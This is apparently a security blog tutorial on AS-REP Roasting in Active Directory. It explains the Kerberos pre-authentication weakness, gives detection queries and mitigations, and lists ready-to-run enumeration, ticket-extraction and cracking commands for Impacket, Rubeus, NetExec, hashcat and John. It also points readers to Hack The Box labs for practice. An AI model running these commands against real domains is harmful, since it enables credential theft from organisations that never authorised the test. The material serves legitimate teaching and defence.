+++
title = "Understanding AS-REP Roasting Attacks: A Deep Dive"
draft = false
tags = ["Windows", "Active Directory", "ASREPRoasting", "Kerberos"]
keywords = ["AS-REP Roasting", "Kerberos authentication", "Active Directory exploitation", "Pre-authentication bypass", "Kerberos security", "Active Directory attacks", "AS-REP ticket extraction", "Kerberos enumeration", "Active Directory security", "Kerberos authentication bypass"]
description = "A comprehensive guide to understanding and exploiting AS-REP Roasting attacks in Active Directory environments. Learn about Kerberos pre-authentication bypass, AS-REP ticket extraction, and how to use tools like Impacket and Rubeus for advanced Active Directory attacks."
author = "bloodstiller"
date = 2024-11-15
toc = true
bold = true
next = true
+++

## Understanding AS-REP Roasting: {#understanding-as-rep-roasting}


### General Overview and Attack Flow: {#general-overview-and-attack-flow}

-   ASREPRoasting is an attack against **Kerberos** authentication where an attacker requests an **AS-REP** (Authentication Service Response) for user accounts that have the `"Do not require Kerberos preauthentication"` setting enabled
    -   The attacker can then attempt to crack the encrypted **TGT** (Ticket-Granting Ticket) offline to obtain plaintext credentials
-   ASREPRoasting is similar to **Kerberoasting** but targets `AS-REP` instead of `TGS-REP` (Ticket-Granting Service Response)


#### Attack Process {#attack-process}

-   Attacker enumerates users with the "Do not require Kerberos preauthentication" setting
    -   Some vendor installation guides require service accounts with `DONT_REQ_PREAUTH` disabled, making these accounts vulnerable
    -   These accounts are less frequently used than Service Principal Names (SPNs), which are more commonly targeted in Kerberoasting attacks
-   Requests an AS-REP from the **Key Distribution Center (KDC)**
-   Cracks the encrypted TGT offline to retrieve plaintext credentials


#### Attack Flow Diagram {#attack-flow-diagram}

```text
    [Attacker]                         [Domain Controller/KDC]                [Target User]
        |                                       |                                 |
        |   1. AS-REQ                           |                                 |
        |   (without Pre-Authentication)        |                                 |
        |-------------------------------------→ |                                 |
        |                                       |                                 |
        |                                       | 2. Checks if DONT_REQ_PREAUTH   |
        |                                       | is set for requested user       |
        |                                       |                                 |
        |   3. AS-REP                           |                                 |
        |   (contains encrypted TGT)            |                                 |
        | ←-------------------------------------|                                 |
        |                                       |                                 |
        | 4. Offline Password                   |                                 |
        |    Cracking Attempt                   |                                 |
        |                                       |                                 |
        |                                       |                                 |
    [Success = Compromised Credentials]         |                                 |
```

+Key Points+:

-   No interaction with target user required
-   No failed login attempts generated
-   Encryption uses user's password hash
-   Can be performed without domain credentials
    -   +For example+: we can run impacket-GetNPUsers without any authentication and retrieve the TGT.
        -   `impacket-GetNPUsers $domain/ -request` (more on tools later)


### Pre-Authentication Process: {#pre-authentication-process}

<!--list-separator-->

-  Normal Pre-Authentication:

    -   Encryption key for **AS-REQ** (Authentication Server Request) is a timestamp encrypted with the user's password hash
    -   If the **AS-REP** timestamp is within a few minutes of the KDC's time, the KDC will issue the **TGT** via AS-REP

    <!--listend-->

    ```text
        [Client]                            [KDC]
            |                                 |
            |  1. AS-REQ                      |
            |  (Encrypted Timestamp)          |
            |-------------------------------->|
            |                                 |
            |             2. Decrypt & Verify |
            |                   Timestamp     |
            |                                 |
            |  3. AS-REP                      |
            |  (TGT if timestamp valid)       |
            |<--------------------------------|
            |                                 |
    ```

<!--list-separator-->

### Without Pre-Authentication (how ASREPRoasting works):

-  Attacker sends a fake AS-REQ
-  The KDC sends a TGT immediately, no password needed
-  The AS-REP includes the TGT and additional encrypted data
-  This data can be cracked offline to obtain the user's key (password hash)


<!--list-separator-->
```text
        [Attacker]                          [KDC]
            |                                 |
            |  1. AS-REQ                      |
            |  (No Pre-Auth Required)         |
            |-------------------------------->|
            |                                 |
            |            2. No Verification   |
            |               Needed            |
            |                                 |
            |  3. AS-REP                      |
            |  (Encrypted TGT + Data)         |
            |<--------------------------------|
            |                                 |
            |  4. Offline Cracking            |
            |     Begins                      |
            |                                 |
```




### Detection and Defense: {#detection-and-defense}


#### Detection Methods {#detection-methods}

-   Monitor Active Directory logs for unusual AS-REP requests, particularly those without preauthentication:
    -   Event ID = `4768` and `4625`
    -   Ticket Encryption Type = `0x17`.
    -   Ticket Options = `0x5080000`.
    -   Service Name = krbtgt
-   Regularly scan user accounts for the `DONT_REQ_PREAUTH` attribute
-   SIEM Detection Rules:
    -   Splunk: `index=windows EventCode=4768 AND Preauthentication_Type="0x0"`
    -   Microsoft Sentinel: `SecurityEvent | where EventID == 4768 | where PreAuthType == "0"`
    -   Elastic: `event.code:4768 AND winlog.event_data.PreAuthType:0`
-   **PowerShell**:
    ```powershell
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
    ```


#### Mitigation Strategies: {#mitigation-strategies}

-   Disable the "Do not require Kerberos preauthentication" setting unless absolutely necessary
-   Enforce strong password policies to reduce the risk of password cracking
-   Use multifactor authentication (MFA) for accounts with elevated privileges
-   Regularly review and audit account settings in Active Directory


#### Defense in Depth Strategies: {#defense-in-depth-strategies}

<!--list-separator-->

#### Network Segmentation:

-   Implement network zones to limit access to the Domain Controller.
-   Use PAWs ([Privileged Access Workstations](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-devices)) for administrative tasks.
-   Deploy honeypot accounts with `DONT_REQ_PREAUTH` to detect attempts.

<!--list-separator-->

#### Monitoring and Alerting:

-   Set up automated scripts to monitor for `DONT_REQ_PREAUTH` changes.
-   Create alerts for sudden increases in AS-REQ traffic.
-   Monitor for known AS-REP Roasting tool signatures.

<!--list-separator-->

#### Active Directory Hardening:

-   Regular security assessments focusing on Kerberos configurations.
-   Implement LAPS for local admin password management.
    -   This way if tickets are extracted they cannot be cracked.
-   Use tiered administration model to limit attack surface.


#### Common Misconfigurations in AD Environments that can lead to AS-REP Roasting: {#common-misconfigurations-in-ad-environments-that-can-lead-to-as-rep-roasting}

**All of the below should be looked out for in your environments**.

-   Default service account configurations in specific applications:
    -   Exchange Server service accounts
    -   SQL Server service accounts
    -   Legacy application service accounts
-   Legacy systems requiring Kerberos compatibility
-   Misconfigured trust relationships between domains
-   Improperly migrated user accounts from older AD versions
-   Third-party applications requiring `DONT_REQ_PREAUTH` for compatibility




## AS-REP-Roasting Enumeration Tools: {#enumeration-tools}
- +Note+: In all of the below enumeration & attack screenshots the user "svc-alfresco" is susceptible to AS-REP Roasting. 
<!--list-separator-->

###  Using PowerView to Enumerate users susceptible to AS-REP Roasting:

```powershell
Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
```
- {{< figure src="/ox-hugo/2024-11-14-200344_.png" >}}

<!--list-separator-->

### Using PowerShell to Enumerate users susceptible to AS-REP Roasting:

-   **Vanilla Powershell**:
```powershell
(New-Object DirectoryServices.DirectorySearcher "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll() | ForEach-Object { $_.Properties | Select-Object @{n='sAMAccountName';e={$_['sAMAccountName'][0]}}, @{n='displayName';e={$_['displayName'][0]}} }
```
-   {{< figure src="/ox-hugo/2024-11-14-202255_.png" >}}

<!--list-separator-->

### Using PowerShell &amp; AD Module to Enumerate users susceptible to AS-REP Roasting:

-   **Powershell Active Directory Powershell Module**:
```powershell
# Shows all details for User Account
Get-ADUser -Filter {DoesNotRequirePreAuth -eq 'True'} | fl

# Provides just the name
Get-ADUser -filter {DoesNotRequirePreAuth -eq 'True'} | select name
```
-   {{< figure src="/ox-hugo/2024-11-14-202419_.png" >}}
-   {{< figure src="/ox-hugo/2024-11-14-202842_.png" >}}

-   **Using Powershell AD Module &amp; an LDAP filter**:
```powershell
Get-ADObject -LdapFilter  "(&(&(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))))"
```

-   {{< figure src="/ox-hugo/2024-11-14-200314_.png" >}}


## AS-REP Roasting +Attack+ Tools: {#as-rep-roasting-tools}

<!--list-separator-->

### Using Impacket-GetNPUsers for AS-REP Roasting Attack:

```shell
# General command to find AS-REP roastable accounts
impacket-GetNPUsers $domain/ -request -format hashcat -outputfile hashes.txt

# With a specified users file and domain controller IP
GetNPUsers.py [DOMAIN]/ -dc-ip [DC_IP] -usersfile [UserFile] -format hashcat -outputfile hashes.txt -no-pass

# Example usage
GetNPUsers.py SUGARAPE/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass

```
-   {{< figure src="/ox-hugo/2024-11-14-203746_.png" >}}

<!--list-separator-->

### Using Rubeus for AS-REP Roasting Attack:

-   Has an **ASREPRoast**: module for Windows-based attacks:
```powershell
# Standard Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# If running via download cradle from PowerSharpPack
PowerSharpPack -rubeus -Command "asreproast /format:hashcat /outfile:hashes.txt"

```
-   {{< figure src="/ox-hugo/2024-11-14-203239_.png" >}}

<!--list-separator-->

### Using Netexec for AS-REP Roasting Attack:

-   In my experience this always needs a list of supplied users to attempt to asreproast with.

    <!--listend-->

```bash
netexec ldap $machine.$domain -u Users.txt -p '' --asreproast asRepTickets.txt
```

-   {{< figure src="/ox-hugo/2024-11-14-204516_.png" >}}

### Targeted AS-REPRoasting Attack:

-   If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute, request the AS-REP for offline cracking, then disable it again
-   The success of this attack depends on the user having a weak password



#### Cracking AS-Rep Tickets {#cracking-as-rep-tickets}

-   **Using Hashcat**:
    -   Mode `18200` for cracking AS-REP hashes
    -   Command: `hashcat -m 18200 asRepTickets.txt wordlist.txt -r rules/best64.rule`

-   **Using John**:
    -   `john --wordlist=~/Wordlist asRepTickets.txt`


#### Tool Comparison Matrix {#tool-comparison-matrix}

| Tool      | Windows/Linux | Auth Required | Stealth Level |
|-----------|---------------|---------------|---------------|
| Rubeus    | Windows       | Yes           | Medium        |
| Impacket  | Linux         | No            | High          |
| PowerView | Windows       | Yes           | Low           |
| NetExec   | Both          | (User list)   | Medium        |


### Comparison with Other Attack Techniques: {#comparison-with-other-attack-techniques}


#### AS-REP Roasting vs Kerberoasting: {#asreproasting-vs-kerberoasting}

-   Lower detection rate due to fewer logging mechanisms
-   Smaller attack surface (fewer vulnerable accounts)
-   Often overlooked in security audits
-   No need for service account enumeration


#### AS-REP Roasting vs Password Spraying: {#asreproasting-vs-password-spraying}

-   More stealthy as it doesn't generate failed login attempts
-   Can be performed without valid domain credentials
-   Offline cracking reduces detection risk
-   Targeted approach vs broad-spectrum attack


### Practice AS-REP Roasting on Hack The Box {#practice-on-hack-the-box}

**The following machines are good for practice AS-REP Roasting**:

-   <https://app.hackthebox.com/machines/Forest>
    -   +My Walkthrough+: <https://bloodstiller.com/walkthroughs/forest-box/>

-   <https://app.hackthebox.com/prolabs/overview/Sauna>
    -   +My Walkthrough+: <https://bloodstiller.com/walkthroughs/sauna-box/>

-   <https://app.hackthebox.com/prolabs/overview/dante>
    -   This is a prolab and AS-REP Roasting is one of many attack/privesc chains.
